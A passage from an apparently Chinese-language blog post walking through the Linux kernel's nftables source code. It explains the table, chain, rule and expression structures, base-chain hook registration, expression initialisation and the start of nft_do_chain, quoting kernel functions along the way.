NFTA_SET_ELEM_LIST_MAX,<br>.policy= nft_set_elem_list_policy,<br>&#125;,<br>[NFT_MSG_GETGEN] = &#123;<br>.call= nf_tables_getgen,<br>.type= NFNL_CB_RCU,<br>&#125;,<br>[NFT_MSG_NEWOBJ] = &#123;<br>.call= nf_tables_newobj,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_GETOBJ] = &#123;<br>.call= nf_tables_getobj,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_DELOBJ] = &#123;<br>.call= nf_tables_delobj,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_GETOBJ_RESET] = &#123;<br>.call= nf_tables_getobj,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_OBJ_MAX,<br>.policy= nft_obj_policy,<br>&#125;,<br>[NFT_MSG_NEWFLOWTABLE] = &#123;<br>.call= nf_tables_newflowtable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_FLOWTABLE_MAX,<br>.policy= nft_flowtable_policy,<br>&#125;,<br>[NFT_MSG_GETFLOWTABLE] = &#123;<br>.call= nf_tables_getflowtable,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_FLOWTABLE_MAX,<br>.policy= nft_flowtable_policy,<br>&#125;,<br>[NFT_MSG_DELFLOWTABLE] = &#123;<br>.call= nf_tables_delflowtable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_FLOWTABLE_MAX,<br>.policy= nft_flowtable_policy,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="nftables数据结构"><a href="#nftables数据结构" class="headerlink" title="nftables数据结构"></a>nftables数据结构</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">网络命名空间→ 连接 → 表  → 链   → 规则     → 表达式<br><br>net→ nftables_pernet→ nft_table→ nft_chain→ nft_rule→ nft_expr<br></code></pre></td></tr></table></figure><p>数据结构不复杂，上下级结构和同级结构之间都是双链表连接</p><p>注意一下nft_expr有 <strong>nft_expr_ops</strong> 表示表达式的处理函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span>*<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>data[]<br>__attribute__((aligned(__alignof__(u64))));<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> &#123;</span><br><span class="hljs-type">void</span>(*eval)(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,<br><span class="hljs-keyword">struct</span> nft_regs *regs,<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_pktinfo *pkt);<br><br>    <br><span class="hljs-type">int</span>(*init)(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr * <span class="hljs-type">const</span> tb[]);<br><br>    <br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span>*<span class="hljs-title">type</span>;</span><br><span class="hljs-type">void</span>*data;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>实际运行调用 <strong>eval</strong></li><li>初始化调用 <strong>init</strong></li></ul><h4 id="nftables数据结构创建函数"><a href="#nftables数据结构创建函数" class="headerlink" title="nftables数据结构创建函数"></a>nftables数据结构创建函数</h4><p>终极目的是注册hook，所以主要关注怎么插入了什么hook</p><h4 id="nf-tables-newtable"><a href="#nf-tables-newtable" class="headerlink" title="nf_tables_newtable"></a>nf_tables_newtable</h4><p>没什么需要注意的</p><ul><li>查看table是否已经存在，已存在则调用 <strong>nf_tables_updtable</strong> 更新table</li><li>不存在则新建table，进行各种初始化，加入net的tables链表</li></ul><h4 id="nf-tables-newchain"><a href="#nf-tables-newchain" class="headerlink" title="nf_tables_newchain"></a>nf_tables_newchain</h4><p>开始和创建table流程一致</p><ul><li>查找table是否存在</li><li>查找chain是否存在，存在则调用 <strong>nf_tables_updchain</strong> 更新chain</li><li>不存在则调用 <strong>nf_tables_addchain</strong> 新建chain</li></ul><p><strong>nf_tables_addchain</strong> 流程</p><ul><li>如果chain是basechain，则初始化basechain<ul><li>调用 <strong>nft_chain_parse_hook</strong> 初始化 <strong>nft_chain_hook</strong></li><li>调用 <strong>nft_basechain_init</strong> 初始化basechain</li></ul></li><li>否则只是分配空间</li><li>分配handle</li><li>复制name</li><li>分配rules空间</li><li>调用 <strong>nf_tables_register_hook</strong> 注册hook</li><li>将chain链入table</li></ul><p>这个过程中涉及注册hook的过程有两个</p><ul><li>basechain的初始化</li><li>调用nf_tables_register_hook注册hook</li></ul><p>看一下具体函数</p><ul><li><p>首先是 <strong>nft_chain_parse_hook</strong>，用于初始化 <strong>nft_chain_hook</strong></p><p>nft_chain_hook结构体要注册的hook由它的 <strong>type</strong> 决定</p><ul><li><p>type先由 <strong>__nft_chain_type_get</strong> 获取default的type</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">type = __nft_chain_type_get(family, NFT_CHAIN_T_DEFAULT);<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> *</span><br><span class="hljs-class">__<span class="hljs-title">nft_chain_type_get</span>(<span class="hljs-title">u8</span> <span class="hljs-title">family</span>, <span class="hljs-title">enum</span> <span class="hljs-title">nft_chain_types</span> <span class="hljs-title">type</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">if</span> (family &gt;= NFPROTO_NUMPROTO ||<br>    type &gt;= NFT_CHAIN_T_MAX)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> chain_type[family][type];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>chain_type</strong> 的初始化在 <strong>nf_tables_module_init</strong> 中进行👆</p><p><em>懒的画二维数组了QAQ</em></p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/chaintype.png" class title="chaintype"><p>nf_tables_module_init初始化的type都是NFT_CHAIN_T_DEFAULT类型，举个:chestnut:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> <span class="hljs-title">nft_chain_filter_netdev</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;filter&quot;</span>,<br>.type= NFT_CHAIN_T_DEFAULT,<br>.family= NFPROTO_NETDEV,<br>.hook_mask= (<span class="hljs-number">1</span> &lt;&lt; NF_NETDEV_INGRESS) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_NETDEV_EGRESS),<br>.hooks= &#123;<br>[NF_NETDEV_INGRESS]= nft_do_chain_netdev,<br>[NF_NETDEV_EGRESS]= nft_do_chain_netdev,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>如果用户定义了具体的type，则由 <strong>nf_tables_chain_type_lookup</strong> 获取type</p><p>具体执行过程是遍历chain_type数组对比name是否一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> *</span><br><span class="hljs-class">__<span class="hljs-title">nf_tables_chain_type_lookup</span>(<span class="hljs-title">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">nla</span>, <span class="hljs-title">u8</span> <span class="hljs-title">family</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain_type</span> *<span class="hljs-title">type</span>;</span><br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NFT_CHAIN_T_MAX; i++) &#123;<br>type = __nft_chain_type_get(family, i);<br><span class="hljs-keyword">if</span> (!type)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">if</span> (!nla_strcmp(nla, type-&gt;name))<br><span class="hljs-keyword">return</span> type;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>nft_basechain_init</strong> 中进行了basechain的type和ops的初始化（红线数据赋值方向，黑线指针指向）</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ops.png" class title="ops"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_basechain_hook_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nf_hook_ops *ops, u8 family,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_chain_hook *hook,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> nft_chain *chain)</span><br>&#123;<br>ops-&gt;pf= family;<br>ops-&gt;hooknum= hook-&gt;num;<br>ops-&gt;priority= hook-&gt;priority;<br>ops-&gt;priv= chain;<br>ops-&gt;hook= hook-&gt;type-&gt;hooks[ops-&gt;hooknum];<br>ops-&gt;hook_ops_type= NF_HOOK_OP_NF_TABLES;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_basechain_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_base_chain *basechain, u8 family,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> nft_chain_hook *hook, u32 flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_hook</span> *<span class="hljs-title">h</span>;</span><br><br>basechain-&gt;type = hook-&gt;type;<br>INIT_LIST_HEAD(&amp;basechain-&gt;hook_list);<br>chain = &amp;basechain-&gt;chain;<br><br><span class="hljs-keyword">if</span> (nft_base_chain_netdev(family, hook-&gt;num)) &#123;<br>list_splice_init(&amp;hook-&gt;<span class="hljs-built_in">list</span>, &amp;basechain-&gt;hook_list);<br>list_for_each_entry(h, &amp;basechain-&gt;hook_list, <span class="hljs-built_in">list</span>)<br>nft_basechain_hook_init(&amp;h-&gt;ops, family, hook, chain);<br><br>basechain-&gt;ops.hooknum= hook-&gt;num;<br>basechain-&gt;ops.priority= hook-&gt;priority;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>nft_basechain_hook_init(&amp;basechain-&gt;ops, family, hook, chain);<br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nf_tables_register_hook</strong> 可以看出注册的是basechain的ops或者hook_list中的nft_hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_register_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_table *table,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> nft_chain *chain)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_base_chain</span> *<span class="hljs-title">basechain</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> *<span class="hljs-title">ops</span>;</span><br><br><span class="hljs-keyword">if</span> (table-&gt;flags &amp; NFT_TABLE_F_DORMANT ||<br>    !nft_is_base_chain(chain))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>basechain = nft_base_chain(chain);<br>ops = &amp;basechain-&gt;ops;<br><br><span class="hljs-keyword">if</span> (basechain-&gt;type-&gt;ops_register)<br><span class="hljs-keyword">return</span> basechain-&gt;type-&gt;ops_register(net, ops);<br><br><span class="hljs-keyword">if</span> (nft_base_chain_netdev(table-&gt;family, basechain-&gt;ops.hooknum))<br><span class="hljs-keyword">return</span> nft_netdev_register_hooks(net, &amp;basechain-&gt;hook_list);<br><br><span class="hljs-keyword">return</span> nf_register_net_hook(net, &amp;basechain-&gt;ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_netdev_register_hooks</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> list_head *hook_list)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_hook</span> *<span class="hljs-title">hook</span>;</span><br><span class="hljs-type">int</span> err, j;<br><br>j = <span class="hljs-number">0</span>;<br>list_for_each_entry(hook, hook_list, <span class="hljs-built_in">list</span>) &#123;<br>err = nf_register_net_hook(net, &amp;hook-&gt;ops);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_register;<br><br>j++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_register:<br>list_for_each_entry(hook, hook_list, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (j-- &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><br>nf_unregister_net_hook(net, &amp;hook-&gt;ops);<br>&#125;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nf-tables-newrule"><a href="#nf-tables-newrule" class="headerlink" title="nf_tables_newrule"></a>nf_tables_newrule</h4><ul><li>查找table</li><li>查找chain</li><li>如果有NFTA_RULE_EXPRESSIONS，遍历所有expressions，调用 <strong>nf_tables_expr_parse</strong> 初始化 <strong>expr_info</strong></li><li>调用 <strong>nf_tables_newexpr</strong> 创建每一个expression</li></ul><p>需要关注 <strong>nf_tables_expr_parse</strong> 和 <strong>nf_tables_newexpr</strong> 两个函数</p><ul><li><p><strong>nf_tables_expr_parse</strong> 函数初始化 <strong>nft_expr_info</strong> 结构体</p><ul><li><p>首先需要根据NFTA_EXPR_NAME获取 <strong>nft_expr_type</strong></p><p>最终调用的是 <strong>__nft_expr_type_get</strong> 函数，从 <strong>nf_tables_expressions</strong> 中获取（对比name）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *__<span class="hljs-title">nft_expr_type_get</span>(<span class="hljs-title">u8</span> <span class="hljs-title">family</span>,</span><br><span class="hljs-class">       <span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">nla</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *<span class="hljs-title">type</span>, *<span class="hljs-title">candidate</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>list_for_each_entry(type, &amp;nf_tables_expressions, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (!nla_strcmp(nla, type-&gt;name)) &#123;<br><span class="hljs-keyword">if</span> (!type-&gt;family &amp;&amp; !candidate)<br>candidate = type;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type-&gt;family == family)<br>candidate = type;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> candidate;<br>&#125;<br></code></pre></td></tr></table></figure><p>nf_tables_expressions的初始化也在nf_tables_module_init中，就是把 <strong>nft_basic_types</strong> 数组的所有元素链进链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *<span class="hljs-title">nft_basic_types</span>[] =</span> &#123;<br>&amp;nft_imm_type,<br>&amp;nft_cmp_type,<br>&amp;nft_lookup_type,<br>&amp;nft_bitwise_type,<br>&amp;nft_byteorder_type,<br>&amp;nft_payload_type,<br>&amp;nft_dynset_type,<br>&amp;nft_range_type,<br>&amp;nft_meta_type,<br>&amp;nft_rt_type,<br>&amp;nft_exthdr_type,<br>&amp;nft_last_type,<br>&amp;nft_counter_type,<br>&#125;;<br></code></pre></td></tr></table></figure><p>举个栗子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> <span class="hljs-title">nft_imm_type</span> __<span class="hljs-title">read_mostly</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;immediate&quot;</span>,<br>.ops= &amp;nft_imm_ops,<br>.policy= nft_immediate_policy,<br>.maxattr= NFTA_IMMEDIATE_MAX,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>info的ops即type的ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_expr_parse</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> nft_expr_info *info)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *<span class="hljs-title">type</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> *<span class="hljs-title">ops</span>;</span><br><br><br>    type = nft_expr_type_get(ctx-&gt;net, ctx-&gt;family, tb[NFTA_EXPR_NAME]);<br><br><br>    ops = type-&gt;ops;<br><br><br>    info-&gt;ops = ops;<br><br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nf_tables_newexpr</strong> 将info的ops赋值给expr，然后调用init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_newexpr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr_info *expr_info,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> nft_expr *expr)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> *<span class="hljs-title">ops</span> =</span> expr_info-&gt;ops;<br><span class="hljs-type">int</span> err;<br><br>expr-&gt;ops = ops;<br><span class="hljs-keyword">if</span> (ops-&gt;init) &#123;<br>err = ops-&gt;init(ctx, expr, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr **)expr_info-&gt;tb);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err1;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>err1:<br>expr-&gt;ops = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="nft-do-chain执行命令"><a href="#nft-do-chain执行命令" class="headerlink" title="nft_do_chain执行命令"></a>nft_do_chain执行命令</h3><h4 id="nft-rule-dp的准备"><a href="#nft-rule-dp的准备" class="headerlink" title="nft_rule_dp的准备"></a>nft_rule_dp的准备</h4><p>nft_do_chain中的rule使用的都是nft_rule_dp而不是nft_rule，但nf_tables_newrule只创建了nft_rule</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nft_do_chain</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_pktinfo *pkt, <span class="hljs-type">void</span> *priv)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span> =</span> priv, *basechain = chain;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">rule</span>, *<span class="hljs-title">last_rule</span>;</span><br><br>    <br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> *<span class="hljs-title">expr</span>, *<span class="hljs-title">last</span>;</span><br><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span> *<span class="hljs-title">blob</span>;</span><br><br>    <br>do_chain:<br><span class="hljs-keyword">if</span> (genbit)<br>blob = rcu_dereference(chain-&gt;blob_gen_1);<br><span class="hljs-keyword">else</span><br>blob = rcu_dereference(chain-&gt;blob_gen_0);<br><br>rule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)blob-&gt;data;<br>last_rule = (<span class="hljs-type">void</span> *)blob-&gt;data + blob-&gt;size;<br>next_rule:<br>regs.verdict.code = NFT_CONTINUE;<br><span class="hljs-keyword">for</span> (; rule &lt; last_rule; rule = nft_rule_next(rule)) &#123;<br>nft_rule_dp_for_each_expr(expr, last, rule) &#123;<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span>__<span class="hljs-title">rcu</span> *<span class="hljs-title">blob_gen_0</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span>__<span class="hljs-title">rcu</span> *<span class="hljs-title">blob_gen_1</span>;</span><br><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span>*<span class="hljs-title">blob_next</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>size;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>data[]<br>__attribute__((aligned(__alignof__(<span class="hljs-keyword">struct</span> 